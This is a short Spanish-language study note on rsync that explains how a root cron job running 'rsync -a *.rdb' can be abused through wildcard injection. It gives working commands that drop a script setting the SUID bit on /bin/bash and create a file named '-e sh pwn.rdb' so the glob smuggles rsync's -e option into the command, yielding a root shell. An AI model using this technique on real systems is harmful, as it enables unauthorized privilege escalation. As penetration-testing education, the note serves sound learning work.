-----
- Tags: #teoria #practica #basico 
- ------

# Rsync

### **Rsync** es una utilidad de sincronización y copia de archivos que se utiliza para transferir y sincronizar datos entre directorios, ya sea en la misma máquina o entre máquinas remotas a través de una red. La principal caraterística distintiva de rysnc es su eficiencia en la trasnsferencia de datos, ya que utiliza algoritmos avanzados que minimizan el uso de ancho de banda y reducen el teimpo necesario para sincronizar archivos. 

----

# Abuso 

### En máquinas donde se use rsync, depende el uso que se le de podría suponer un riesgo, por ejemplo, supongamos que tenemos una tarea cron que es ejecutada por root la cual se encarga de realizar la siguiente operación. 

```bash 
rsync -a *.rdb rsync://backup:873/src/rdb
```

### Lo que vemos es que se esta haciendo uso del '**\***' lo que no es buena idea ya que de alguna manera se confía en el input del usuario (Sobre todo si el directorio de trabajo contiene permisos de escritura). 

### Al utilizar **\*.rdb** se estan englobando a todos los archivos finalizados en **.rdb** de manera que podríamos abusar de esto de una manera muy sensilla. 

```bash
echo -e "#!/bin/bash\n\nchmod u+s /bin/bash" > pwn.rdb 
touch -- '-e sh pwn.rdb'
```

### De esta manera lo que estamos haciendo es crear un archivo llamada **pwn.rdb** 

#### pwn.rdb content:
```bash
#!/bin/bash

chmod u+s /bin/bash
```

### Y por otro lado crear un archivo llamado **-e sh pwn.rdb**, lo que ocaciona que al estar haciendo uso del '**\***' (*Wildcards*) para englobar todos los archivos que terminen en **.rdb**, ambos terminana en *.rdb* pero el primero (**pwn.rdb**) contiene un script en bash que le otorga un permiso SUID a la bash y el otro (**-e sh pwn.rdb**) permite inyectar este "archivo" como comando, y dado que **rsync** cuenta con el parametro **-e** el cual permite ejecución de comandos. Esto lo podemos encontrar en páginas como [gtfobins](https://gtfobins.github.io/gtfobins/rsync/#shell).


